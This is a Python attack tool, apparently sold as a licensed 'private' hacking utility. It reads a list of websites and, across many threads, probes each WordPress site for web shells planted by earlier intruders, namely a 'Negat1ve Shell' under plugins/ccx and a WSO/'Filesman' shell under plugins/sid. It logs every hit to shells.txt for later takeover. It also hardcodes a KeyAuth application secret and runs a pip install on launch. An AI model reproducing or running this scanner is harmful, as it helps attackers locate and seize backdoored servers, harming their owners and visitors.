# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path 
import os
os.system("pip install keyauth")
from keyauth import api
import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
if sys.version_info.minor < 10: 
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title Python Example')  
elif platform.system() == 'Linux':
    os.system('clear')  
    sys.stdout.write("\x1b]0;Python Example\x07")
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  
    os.system('''echo - n - e "\033]0;Python Example\007"''') 
print("Initializing....")
def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest
keyauthapp = api(
    name = "ravi", 
    ownerid = "kIik4ediGG", 
    secret = "7b47d1595972c84c46cfb7d0e834b98065ba5f34d6fe362cbea60b4475ff34d9", 
    version = "1.0",
    hash_to_check = getchecksum()
)
os.system('cls' if os.name == 'nt' else 'clear')
print ("""TooL Free Priv H0rn3t sp1d3rs """)
print(f"\033[0;31mCurrent Session Validation Status: {keyauthapp.check()}")
print(f"\033[0;31mBlacklisted? : {keyauthapp.checkblacklist()}")  
def answer():
    try:
        print("""\033[0;32m
1.Login
2.Register
3.Upgrade
4.License Key Only
        """)
        ans = input("\033[1;33mSelect Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = input('\033[0;31mProvide password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('\033[0;31mProvide username: ')
            password = input('\033[0;31mProvide password: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('\033[0;31mProvide username: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.upgrade(user, license)
        elif ans == "4":
            key = input('\033[0;32mEnter your license: ')
            keyauthapp.license(key)
        else:
            print("\n\033[1;33mNot Valid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)
answer()
'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''
print("\nUser data: ")
print("Username: " + keyauthapp.user_data.username)
print("IP address: " + keyauthapp.user_data.ip)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
subs = keyauthapp.user_data.subscriptions  
for i in range(len(subs)):
    sub = subs[i]["subscription"]  
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  
    timeleft = subs[i]["timeleft"] 

    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")
onlineUsers = keyauthapp.fetchOnline()
OU = "" 
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "
print("\n" + OU + "\n")
print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")
os.system("clear")
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN
os.system('cls' if os.name == 'nt' else 'clear')
print ("""TooL Free Priv H0rn3t sp1d3rs""")
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    fileName = input('\033[1;31mSite Lists: ')
    file = Path(__file__).with_name(fileName)
    target = [i.strip() for i in file.open('r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n\033[1;31m  [!] Enter <' + path[len(path) - 1] + '> <your list.txt>')
poolAmount = int(input("\033[1;31mThreads: "))
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site
def FourHundredThree(url):
    try:        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print ('\033[0;32m-|' + url + '{}[Succefully]'.format(fg))
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print ('\033[0;32m-|' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
            else:
                print ('-|' + url + ' {}[Failed]'.format(fr))
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print ('\033[0;32m-|' + url + '{}[Succefully]'.format(fg))
                open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print ('\033[0;32m-|' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
            else:
                print ('-|' + url + ' {}[Failed]'.format(fr))        
    except :
        print ('\033[0;31m-|' + url + ' {}[Failed]'.format(fr))
mp = Pool(poolAmount)
mp.map(FourHundredThree, target)
mp.close()
mp.join()